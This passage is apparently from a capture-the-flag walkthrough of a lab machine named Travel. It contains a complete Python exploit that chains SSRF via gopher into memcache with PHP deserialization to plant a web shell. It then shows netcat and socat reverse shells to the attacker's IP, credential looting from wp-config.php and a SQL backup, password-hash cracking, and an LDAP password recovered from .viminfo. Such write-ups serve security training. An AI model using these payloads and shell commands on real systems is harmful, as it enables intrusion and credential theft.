+</pre></table></code></div></div><p>And this will trigger the <code class="language-plaintext highlighter-rouge">deserialization</code></p><p>And after that i can simply run <strong>commands</strong> on my web shell</p><p>Here is the full script that will do all the work for me</p><blockquote><p>0xprashant.py</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="n">LHOST</span><span class="o">=</span><span class="s">"10.10.14.9"</span>
+<span class="nb">file</span> <span class="o">=</span> <span class="s">"0xprashant.php"</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://blog.travel.htb/"</span>
+<span class="k">def</span> <span class="nf">payload</span> <span class="p">():</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="s">'O:14:"TemplateHelper":2:{s:4:"file";s:'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">file</span><span class="p">))</span><span class="o">+</span><span class="s">':"'</span><span class="o">+</span><span class="nb">file</span><span class="o">+</span><span class="s">'";s:4:"data";s:31:"&lt;?php system($_REQUEST["cmd"]);";}'</span>
+    <span class="c1">#md5(md5("http://www.travel.htb/newsfeed/customfeed.xml"):"spc") = 4e5612ba079c530a6b1f148c0b352241
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"%0d%0aset xct_4e5612ba079c530a6b1f148c0b352241 4 0 "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">))</span> <span class="o">+</span> <span class="s">"%0d%0a"</span> <span class="o">+</span>  <span class="n">code</span> <span class="o">+</span> <span class="s">"%0d%0a"</span>
+    <span class="n">encodedpayload</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">payload</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"+"</span><span class="p">,</span><span class="s">"%20"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"%2F"</span><span class="p">,</span><span class="s">"/"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"%25"</span><span class="p">,</span><span class="s">"%"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"%3A"</span><span class="p">,</span><span class="s">":"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">"gopher://127.00.0.1:11211/_"</span> <span class="o">+</span> <span class="n">encodedpayload</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">()</span>
+<span class="k">print</span> <span class="s">"[+]payload is=:  "</span> <span class="o">+</span> <span class="n">payload</span>
+<span class="k">print</span> <span class="s">"[+] Requesting using ssrf in phpmemcache"</span>
+
+<span class="n">ssrf_url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="s">"awesome-rss/?debug=yes&amp;custom_feed_url="</span><span class="o">+</span><span class="n">payload</span>
+<span class="k">print</span> <span class="n">ssrf_url</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">ssrf_url</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"[+] Its time for deserialization"</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">"awesome-rss/"</span><span class="p">)</span>
+<span class="n">payload_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"wp-content/themes/twentytwenty/logs/"</span><span class="o">+</span><span class="nb">file</span>
+<span class="k">print</span> <span class="n">payload_url</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">print</span> <span class="n">payload_url</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">payload_url</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">break</span><span class="p">;</span>
+
+<span class="k">print</span> <span class="s">"[+] You are ready to go"</span>
+<span class="k">print</span> <span class="s">"[+] Run commands on web shell now"</span>
+</pre></table></code></div></div><h1 id="getting-shell-as-www-data">Getting shell as www-data</h1><p>Running the exploit is the way to go now…..!!!!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>➜  travel git:<span class="o">(</span>master<span class="o">)</span> ✗ python 0xprashant.py
+<span class="o">[</span>+]payload <span class="nv">is</span><span class="o">=</span>:  gopher://127.00.0.1:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20109%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:14:%220xprashant.php%22%3Bs:4:%22data%22%3Bs:31:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%22%3B%7D%0d%0a
+<span class="o">[</span>+] Requesting using ssrf <span class="k">in </span>phpmemcache
+http://blog.travel.htb/awesome-rss/?debug<span class="o">=</span><span class="nb">yes</span>&amp;custom_feed_url<span class="o">=</span>gopher://127.00.0.1:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20109%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:14:%220xprashant.php%22%3Bs:4:%22data%22%3Bs:31:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%22%3B%7D%0d%0a
+<span class="o">[</span>+] Its <span class="nb">time </span><span class="k">for </span>deserialization
+http://blog.travel.htb/wp-content/themes/twentytwenty/logs/0xprashant.php
+http://blog.travel.htb/wp-content/themes/twentytwenty/logs/0xprashant.php
+200
+<span class="o">[</span>+] You are ready to go
+<span class="o">[</span>+] Run commands on web shell now
+</pre></table></code></div></div><p>I can <code class="language-plaintext highlighter-rouge">access</code> <strong>0xprashant.php</strong> on the following url</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>http://blog.travel.htb/wp-content/themes/twentytwenty/logs/0xprashant.php
+</pre></table></code></div></div><h2 id="running-commands">Running commands</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>➜  travel git:<span class="o">(</span>master<span class="o">)</span> ✗ curl <span class="s2">"http://blog.travel.htb/wp-content/themes/twentytwenty/logs/0xprashant.php?cmd=whoami"</span> 
+www-data
+</pre></table></code></div></div><p>Lets see if <code class="language-plaintext highlighter-rouge">netcat</code> is installed or not so we can get a <strong>reverse shell</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>➜  travel git:<span class="o">(</span>master<span class="o">)</span> ✗ curl <span class="s2">"http://blog.travel.htb/wp-content/themes/twentytwenty/logs/0xprashant.php?cmd=which%20nc"</span> 
+/bin/nc
+</pre></table></code></div></div><p><strong>Congratulations we are lucky enough !!!!</strong></p><h2 id="bash-shell-as-www-data">Bash shell as www-data</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>➜  travel git:<span class="o">(</span>master<span class="o">)</span> ✗ curl <span class="s2">"http://blog.travel.htb/wp-content/themes/twentytwenty/logs/0xprashant.php?cmd=nc%20-e%20/bin/bash%2010.10.14.9%201234"</span> 
+</pre></table></code></div></div><p>And on my <code class="language-plaintext highlighter-rouge">ncat</code> listener we got connection back !!!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>➜  prashant rlwrap nc <span class="nt">-nlvp</span> 1234                                                                                                        
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.10.189.
+Ncat: Connection from 10.10.10.189:56148.
+</pre></table></code></div></div><h2 id="upgrading-your-shell">Upgrading your shell</h2><p><code class="language-plaintext highlighter-rouge">Python</code> or <code class="language-plaintext highlighter-rouge">python3</code> is not installed on the machine but <code class="language-plaintext highlighter-rouge">socat</code> is installed</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>which socat
+/usr/bin/socat
+</pre></table></code></div></div><p>We can upgrade our shell using <code class="language-plaintext highlighter-rouge">socat</code></p><blockquote><p>target machine</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:10.10.14.9:4444
+</pre></table></code></div></div><blockquote><p>My machine</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>➜  prashant socat file:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0 tcp-listen:4444
+</pre></table></code></div></div><p>On my <code class="language-plaintext highlighter-rouge">socat</code> listener i got connection back</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>➜  prashant socat file:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0 tcp-listen:4444
+www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs<span class="err">$</span>
+</pre></table></code></div></div><p>If we look at its <code class="language-plaintext highlighter-rouge">hostname</code> we are in a docker <code class="language-plaintext highlighter-rouge">container</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>www-data@blog:/<span class="nv">$ </span><span class="nb">hostname
+</span>blog
+</pre></table></code></div></div><blockquote><p><code class="language-plaintext highlighter-rouge">ip a</code></p></blockquote><p>And we can confirm this by checking its ip it should be <code class="language-plaintext highlighter-rouge">10.10.10.189</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>www-data@blog:/<span class="nv">$ </span>ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+10: eth0@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    <span class="nb">link</span>/ether 02:42:ac:1e:00:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.30.0.10/24 brd 172.30.0.255 scope global eth0
+       valid_lft forever preferred_lft forever
+</pre></table></code></div></div><p>So we need to escalate from it.</p><h1 id="privilege-escalation-to-lynik-admin">Privilege escalation to lynik-admin</h1><blockquote><p>it was a short story but good</p></blockquote><p>i know that wordpress saves his <code class="language-plaintext highlighter-rouge">juicy</code> <strong>information</strong> in the file called <code class="language-plaintext highlighter-rouge">wp-config.php</code></p><blockquote><p>wp-config.php</p></blockquote><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="c1">// ** MySQL settings - You can get this info from your web host ** //                                                                                 </span>
+<span class="cd">/** The name of the database for WordPress */</span>                                                                                                         
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'wp'</span> <span class="p">);</span>                                                                                                                            
+
+<span class="cd">/** MySQL database username */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'wp'</span> <span class="p">);</span>
+
+<span class="cd">/** MySQL database password */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'fiFtDDV9LYe8Ti'</span> <span class="p">);</span>
+
+<span class="cd">/** MySQL hostname */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'127.0.0.1'</span> <span class="p">);</span>
+</pre></table></code></div></div><p>The only <code class="language-plaintext highlighter-rouge">important</code> thing i hot the <code class="language-plaintext highlighter-rouge">database</code> information</p><p>I can logged in myself to the mysql</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>mysql <span class="nt">-h</span> 127.0.0.1 <span class="nt">-u</span> wp <span class="nt">-p</span>
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>www-data@blog:/var/www/html<span class="nv">$ </span>mysql <span class="nt">-h</span> 127.0.0.1 <span class="nt">-u</span> wp <span class="nt">-p</span>
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MariaDB connection <span class="nb">id </span>is 211558
+Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
+
+MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> 
+</pre></table></code></div></div><p>And We are in cheers !!!</p><blockquote><p><code class="language-plaintext highlighter-rouge">show DATABASES;</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> show DATABASES<span class="p">;</span>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| wp                 |
++--------------------+
+4 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
+</pre></table></code></div></div><blockquote><p><code class="language-plaintext highlighter-rouge">use wp</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> use wp<span class="p">;</span>
+Reading table information <span class="k">for </span>completion of table and column names
+You can turn off this feature to get a quicker startup with <span class="nt">-A</span>
+
+Database changed
+MariaDB <span class="o">[</span>wp]&gt;
+</pre></table></code></div></div><blockquote><p><code class="language-plaintext highlighter-rouge">show tables;</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>MariaDB <span class="o">[</span>wp]&gt; show tables<span class="p">;</span>
++-----------------------+
+| Tables_in_wp          |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_termmeta           |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+12 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
+</pre></table></code></div></div><blockquote><p><code class="language-plaintext highlighter-rouge">select * from wp_users</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>MariaDB <span class="o">[</span>wp]&gt; <span class="k">select</span> <span class="k">*</span> from wp_users<span class="p">;</span>
++----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email       | user_url         | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
+|  1 | admin      | <span class="nv">$P$BIRXVj</span>/ZG0YRiBH8gnRy0chBx67WuK/ | admin         | admin@travel.htb | http://localhost | 2020-04-13 13:19:01 |                     |           0 | admin        |
++----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
+1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
+</pre></table></code></div></div><p>And we got a <code class="language-plaintext highlighter-rouge">hash</code></p><p>I tried to decrypt the hash with <code class="language-plaintext highlighter-rouge">john</code> but it took forever to carck it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>➜  prashant john wp-hash <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt                            
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>phpass <span class="o">[</span>phpass <span class="o">(</span><span class="nv">$P$ </span>or <span class="nv">$H$)</span> 128/128 XOP 4x2]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 8192 <span class="k">for </span>all loaded hashes
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+</pre></table></code></div></div><blockquote><p>Note – This way just turned out to be a rabbit hole sorry !!</p></blockquote><p>After some basic <code class="language-plaintext highlighter-rouge">enum</code> i got a <code class="language-plaintext highlighter-rouge">.sql</code> file</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>www-data@blog:/opt/wordpress<span class="nv">$ </span><span class="nb">ls
+</span>backup-13-04-2020.sql
+</pre></table></code></div></div><p>If i do <code class="language-plaintext highlighter-rouge">cat backup-13-04-2020.sql</code> my terminal is filled up totally but at the bottom of the output I got another <code class="language-plaintext highlighter-rouge">hash</code> for user <strong>lynik-admin</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>LOCK TABLES <span class="sb">`</span>wp_users<span class="sb">`</span> WRITE<span class="p">;</span>
+/<span class="k">*</span><span class="o">!</span>40000 ALTER TABLE <span class="sb">`</span>wp_users<span class="sb">`</span> DISABLE KEYS <span class="k">*</span>/<span class="p">;</span>
+INSERT INTO <span class="sb">`</span>wp_users<span class="sb">`</span> VALUES <span class="o">(</span>1,<span class="s1">'admin'</span>,<span class="s1">'$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/'</span>,<span class="s1">'admin'</span>,<span class="s1">'admin@travel.htb'</span>,<span class="s1">'http://localhost'</span>,<span class="s1">'2020-04-13 13:19:01'</span>,<span class="s1">''</span>,0,<span class="s1">'admin'</span><span class="o">)</span>,<span class="o">(</span>2,<span class="s1">'lynik-admin'</span>,<span class="s1">'$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.'</span>,<span class="s1">'lynik-admin'</span>,<span class="s1">'lynik@travel.htb'</span>,<span class="s1">''</span>,<span class="s1">'2020-04-13 13:36:18'</span>,<span class="s1">''</span>,0,<span class="s1">'Lynik Schmidt'</span><span class="o">)</span><span class="p">;</span>
+/<span class="k">*</span><span class="o">!</span>40000 ALTER TABLE <span class="sb">`</span>wp_users<span class="sb">`</span> ENABLE KEYS <span class="k">*</span>/<span class="p">;</span>
+UNLOCK TABLES<span class="p">;</span>
+/<span class="k">*</span><span class="o">!</span>40103 SET <span class="nv">TIME_ZONE</span><span class="o">=</span>@OLD_TIME_ZONE <span class="k">*</span>/<span class="p">;</span>
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.</code></p><h2 id="cracking-password-hash-with-john">Cracking password hash with john</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>➜  prashant john <span class="nb">hash</span> <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>phpass <span class="o">[</span>phpass <span class="o">(</span><span class="nv">$P$ </span>or <span class="nv">$H$)</span> 128/128 XOP 4x2]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 8192 <span class="k">for </span>all loaded hashes
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+1stepcloser      <span class="o">(</span>?<span class="o">)</span>
+1g 0:00:01:36 DONE <span class="o">(</span>2020-05-21 18:05<span class="o">)</span> 0.01039g/s 7591p/s 7591c/s 7591C/s 1stward..1remington
+Use the <span class="s2">"--show --format=phpass"</span> options to display all of the cracked passwords reliably
+Session completed
+</pre></table></code></div></div><p>And the hash <code class="language-plaintext highlighter-rouge">cracked</code> is <code class="language-plaintext highlighter-rouge">1stepcloser</code></p><h1 id="got-usertxt">Got user.txt</h1><p>Now i can simply login as <code class="language-plaintext highlighter-rouge">lynik-admin</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>➜  prashant sshpass <span class="nt">-p</span> <span class="s2">"1stepcloser"</span> ssh lynik-admin@travel.htb         
+Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-26-generic x86_64<span class="o">)</span>
+
+  System information as of Thu 21 May 2020 05:08:13 PM UTC
+
+  System load:                      0.0
+  Usage of /:                       46.2% of 15.68GB
+  Memory usage:                     14%
+  Swap usage:                       0%
+  Processes:                        209
+  Users logged <span class="k">in</span>:                  0
+  IPv4 address <span class="k">for </span>br-836575a2ebbb: 172.20.0.1
+  IPv4 address <span class="k">for </span>br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address <span class="k">for </span>docker0:         172.17.0.1
+  IPv4 address <span class="k">for </span>eth0:            10.10.10.189
+
+Last login: Thu May 21 06:06:08 2020 from 10.10.14.9
+lynik-admin@travel:~<span class="err">$</span>
+</pre></table></code></div></div><p>And we got <code class="language-plaintext highlighter-rouge">user.txt</code> flag</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+1b8<span class="k">*************************</span>87b
+lynik-admin@travel:~<span class="err">$</span>
+</pre></table></code></div></div><h1 id="privilege-escalation-to-root">Privilege escalation to root</h1><p>The road to the root is also very <strong>interesting</strong> , Its not that <code class="language-plaintext highlighter-rouge">easy</code> to catch but after some basic enum we can find the way.</p><p>If we do a <code class="language-plaintext highlighter-rouge">ls -a</code> to list the hidden files we get to know that there is a file calles <code class="language-plaintext highlighter-rouge">.ldaprc</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 40
+drwx------ 4 lynik-admin lynik-admin 4096 May 22 00:50 <span class="nb">.</span>
+drwxr-xr-x 4 root        root        4096 Apr 23 17:31 ..
+lrwxrwxrwx 1 lynik-admin lynik-admin    9 Apr 23 17:31 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 lynik-admin lynik-admin  220 Feb 25 12:03 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 lynik-admin lynik-admin 3771 Feb 25 12:03 .bashrc
+drwx------ 2 lynik-admin lynik-admin 4096 Apr 23 19:34 .cache
+<span class="nt">-rw-r--r--</span> 1 lynik-admin lynik-admin   82 Apr 23 19:35 .ldaprc
+drwxrwxr-x 3 lynik-admin lynik-admin 4096 May 21 05:01 .local
+<span class="nt">-rw-r--r--</span> 1 lynik-admin lynik-admin  807 Feb 25 12:03 .profile
+<span class="nt">-r--r--r--</span> 1 root        root          33 May 20 20:23 user.txt
+<span class="nt">-rw-------</span> 1 lynik-admin lynik-admin  861 Apr 23 19:35 .viminfo
+</pre></table></code></div></div><blockquote><p>.ldaprc is a LDAP configuration file</p></blockquote><blockquote><p>.ldaprc</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> .ldaprc
+HOST ldap.travel.htb
+BASE <span class="nv">dc</span><span class="o">=</span>travel,dc<span class="o">=</span>htb
+BINDDN <span class="nv">cn</span><span class="o">=</span>lynik-admin,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+</pre></table></code></div></div><p>Okay..so the user <code class="language-plaintext highlighter-rouge">lynik-admin</code> is in the LDAP , And later on if we read the <code class="language-plaintext highlighter-rouge">.viminfo</code> file</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre><td class="rouge-code"><pre><span class="c"># This viminfo file was generated by Vim 8.1. </span>
+<span class="c"># You may edit it if you're careful!                                                                </span>
+<span class="c"># Viminfo version                                                                                                                                     </span>
+|1,4       
+<span class="c"># Value of 'encoding' when this file was written    </span>
+<span class="k">*</span><span class="nv">encoding</span><span class="o">=</span>utf-8                                                                                                                                                                 
+<span class="c"># hlsearch on (H) or off (h):                                         </span>
+~h                                                                                                                                                    
+<span class="c"># Command Line History (newest to oldest):                                                       </span>
+:wq!
+|2,0,1587670530,,<span class="s2">"wq!"</span>
+
+<span class="c"># Search String History (newest to oldest):</span>
+
+<span class="c"># Expression History (newest to oldest):</span>
+
+<span class="c"># Input Line History (newest to oldest):</span>
+
+<span class="c"># Debug Line History (newest to oldest):</span>
+
+<span class="c"># Registers:</span>
+<span class="s2">""</span>1     LINE    0
+        BINDPW Theroadlesstraveled
+|3,1,1,1,1,0,1587670528,<span class="s2">"BINDPW Theroadlesstraveled"</span>
+
+<span class="c"># File marks:</span>
+<span class="s1">'0  3  0  ~/.ldaprc
+|4,48,3,0,1587670530,"~/.ldaprc"
+# Jumplist (newest first):
+-'</span>  3  0  ~/.ldaprc
+|4,39,3,0,1587670530,<span class="s2">"~/.ldaprc"</span>
+-<span class="s1">''</span>  1  0  ~/.ldaprc
+|4,39,1,0,1587670527,<span class="s2">"~/.ldaprc"</span>
+
+<span class="c"># History of marks within files (newest to oldest):</span>
+
+<span class="o">&gt;</span> ~/.ldaprc
+        <span class="k">*</span>       1587670529      0
+        <span class="s2">"       3       0
+        .       4       0
+        +       4       0
